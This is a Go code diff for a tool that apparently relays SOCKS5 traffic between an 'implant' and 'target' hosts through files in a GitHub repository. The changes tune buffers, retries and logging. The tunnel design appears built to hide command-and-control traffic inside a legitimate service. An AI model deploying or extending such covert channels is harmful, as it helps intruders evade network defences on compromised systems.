@@ -21,6 +21,9 @@ const (
 	inTag = "IN"
 	// Wait time in milliseconds
 	waitTime = 1000
+	// buffer size
+	// No larger than 1MB (github limitaion)
+	bufferSize = 900 * 1024
 )
 
 type GithubSocks5 struct {
@@ -31,12 +34,15 @@ type GithubSocks5 struct {
 }
 
 type GithubReaderWriter struct {
-	client   *github.Client
-	user     string
-	repo     string
-	uuid     string
-	readTag  string
-	writeTag string
+	client         *github.Client
+	user           string
+	repo           string
+	uuid           string
+	readTag        string
+	writeTag       string
+	readerBuf      []byte
+	readerEndIndex int
+	readerCurIndex int
 }
 
 func (g *GithubSocks5) StartServer() {
@@ -73,14 +79,21 @@ func (g *GithubSocks5) handleConn(conn net.Conn) {
 		return
 	}
 	fmt.Println("Connected to target using uuid:", githubRW.uuid)
+	// tcpConn has implemented WriteTo and ReadFrom
+	// use it directly will use the WriteTo path
+	// Eventually fall back to the generic path
+	// result in the use of CopyBuffer with a buffer size of 32k
+	// which is not the best choice
+	// SO we warp the connection with a NoWriteToReader to avoid the WriteTo path
+	noWriteToReader := NewNoWritetoReader(conn)
 	go func() {
-		buf := make([]byte, 256*1024)
-		_, err := io.CopyBuffer(githubRW, conn, buf)
+		buf := make([]byte, bufferSize)
+		_, err := io.CopyBuffer(githubRW, noWriteToReader, buf)
 		if err != nil {
 			fmt.Println("Failed to copy from implant to target:", err)
 		}
 	}()
-	buf := make([]byte, 256*1024)
+	buf := make([]byte, bufferSize)
 	_, err = io.CopyBuffer(conn, githubRW, buf)
 	if err != nil {
 		fmt.Println("Failed to copy from target to implant:", err)
@@ -92,6 +105,7 @@ func (g *GithubSocks5) StartClient() {
 		target, githubRW, err := g.githubAccept()
 		if err != nil {
 			fmt.Println("Failed to accept connection:", err)
+			time.Sleep(waitTime * time.Millisecond)
 			continue
 		}
 		fmt.Println("Accepted connection with target:", target, "uuid:", githubRW.uuid)
@@ -104,15 +118,25 @@ func (g *GithubSocks5) handleAcceptedConn(target string, githubRW *GithubReaderW
 		fmt.Println("Failed to connect to target:", err)
 		return
 	}
+	// buffer size, seems useless.......
+	err = conn.(*net.TCPConn).SetReadBuffer(bufferSize)
+	if err != nil {
+		fmt.Println("Failed to set read buffer:", err)
+	}
+	err = conn.(*net.TCPConn).SetWriteBuffer(bufferSize)
+	if err != nil {
+		fmt.Printf("Failed to set write buffer: %v\n", err)
+	}
 	fmt.Println("Connected to target:", target)
+	noWriteToReader := NewNoWritetoReader(conn)
 	go func() {
-		buf := make([]byte, 256*1024)
-		_, err := io.CopyBuffer(githubRW, conn, buf)
+		buf := make([]byte, bufferSize)
+		_, err := io.CopyBuffer(githubRW, noWriteToReader, buf)
 		if err != nil {
 			fmt.Println("Failed to copy from target to implant:", err)
 		}
 	}()
-	buf := make([]byte, 256*1024)
+	buf := make([]byte, bufferSize)
 	_, err = io.CopyBuffer(conn, githubRW, buf)
 	if err != nil {
 		fmt.Println("Failed to copy from implant to target:", err)
@@ -233,7 +257,7 @@ func (g *GithubSocks5) githubConnect(target string) (*GithubReaderWriter, error)
 			Content: []byte(target),
 		})
 		if err != nil {
-			if strings.Contains(err.Error(), "409 is at") {
+			if strings.Contains(err.Error(), ": 409") {
 				time.Sleep(waitTime * time.Millisecond)
 				continue
 			}
@@ -250,12 +274,15 @@ func (g *GithubSocks5) githubConnect(target string) (*GithubReaderWriter, error)
 		time.Sleep(waitTime * time.Millisecond)
 	}
 	return &GithubReaderWriter{
-		client:   g.client,
-		user:     g.user,
-		repo:     g.repo,
-		uuid:     newConnTag,
-		readTag:  inTag,
-		writeTag: outTag,
+		client:         g.client,
+		user:           g.user,
+		repo:           g.repo,
+		uuid:           newConnTag,
+		readTag:        inTag,
+		writeTag:       outTag,
+		readerBuf:      make([]byte, 1024*1024),
+		readerEndIndex: 0,
+		readerCurIndex: 0,
 	}, nil
 }
 
@@ -295,12 +322,15 @@ func (g *GithubSocks5) githubAccept() (string, *GithubReaderWriter, error) {
 					return "", nil, fmt.Errorf("failed to get content: %w", err)
 				}
 				return data, &GithubReaderWriter{
-					client:   g.client,
-					user:     g.user,
-					repo:     g.repo,
-					uuid:     uuid,
-					readTag:  outTag,
-					writeTag: inTag,
+					client:         g.client,
+					user:           g.user,
+					repo:           g.repo,
+					uuid:           uuid,
+					readTag:        outTag,
+					writeTag:       inTag,
+					readerBuf:      make([]byte, 1024*1024),
+					readerEndIndex: 0,
+					readerCurIndex: 0,
 				}, nil
 			}
 		}
@@ -320,6 +350,13 @@ func NewGithubSocks5(user string, repo string, token string, serverAddr string) 
 }
 
 func (grw *GithubReaderWriter) Read(p []byte) (n int, err error) {
+	fmt.Printf("%d %d\n", grw.readerCurIndex, grw.readerEndIndex)
+	if grw.readerCurIndex < grw.readerEndIndex {
+		n = copy(p, grw.readerBuf[grw.readerCurIndex:grw.readerEndIndex])
+		grw.readerCurIndex += n
+		// fmt.Printf("Read %s\n", p)
+		return n, nil
+	}
 	fileName := fmt.Sprintf("%s_%s", grw.readTag, grw.uuid)
 	fmt.Printf("Waiting for read file %s\n", fileName)
 	for {
@@ -336,8 +373,17 @@ func (grw *GithubReaderWriter) Read(p []byte) (n int, err error) {
 		if err != nil {
 			return 0, fmt.Errorf("failed to get content: %w", err)
 		}
-		copy(p, data)
-		fmt.Printf("Read %s\n", p)
+		fmt.Printf("Read %d bytes from github\n", len(data))
+		// fmt.Printf("Read Github \n%s\n", data)
+		nn := copy(grw.readerBuf, data)
+		grw.readerCurIndex = 0
+		grw.readerEndIndex = nn
+		if nn != len(data) {
+			panic("copy failed")
+		}
+		n = copy(p, grw.readerBuf[grw.readerCurIndex:grw.readerEndIndex])
+		// fmt.Printf("Read %s\n", p[:n])
+		grw.readerCurIndex += n
 		// Delete the file
 		for {
 			_, _, err = grw.client.Repositories.DeleteFile(context.Background(), grw.user, grw.repo, "implant/"+fileName, &github.RepositoryContentFileOptions{
@@ -345,7 +391,8 @@ func (grw *GithubReaderWriter) Read(p []byte) (n int, err error) {
 				SHA:     github.String(content.GetSHA()),
 			})
 			if err != nil {
-				if strings.Contains(err.Error(), "409 is at") {
+				if strings.Contains(err.Error(), ": 409") {
+					// fmt.Printf("%v", err)
 					time.Sleep(waitTime * time.Millisecond)
 					continue
 				}
@@ -355,7 +402,7 @@ func (grw *GithubReaderWriter) Read(p []byte) (n int, err error) {
 				return 0, fmt.Errorf("failed to delete file: %w", err)
 			}
 		}
-		return len(data), nil
+		return n, nil
 	}
 }
 
@@ -370,7 +417,7 @@ func (grw *GithubReaderWriter) Write(p []byte) (n int, err error) {
 		})
 
 		if err != nil {
-			if strings.Contains(err.Error(), "409 is at") {
+			if strings.Contains(err.Error(), ": 409") {
 				time.Sleep(waitTime * time.Millisecond)
 				continue
 			}
@@ -378,8 +425,7 @@ func (grw *GithubReaderWriter) Write(p []byte) (n int, err error) {
 		}
 		break
 	}
-	fmt.Printf("Write %s\n", p)
-
+	fmt.Printf("Write %d bytes to github\n", len(p))
 	// Wait the file to be deleted
 	for {
 		_, _, _, err := grw.client.Repositories.GetContents(context.Background(), grw.user, grw.repo, "implant/"+fileName, nil)
@@ -390,5 +436,6 @@ func (grw *GithubReaderWriter) Write(p []byte) (n int, err error) {
 		}
 		time.Sleep(waitTime * time.Millisecond)
 	}
+	fmt.Printf("Write Success\n")
 	return len(p), nil
 }
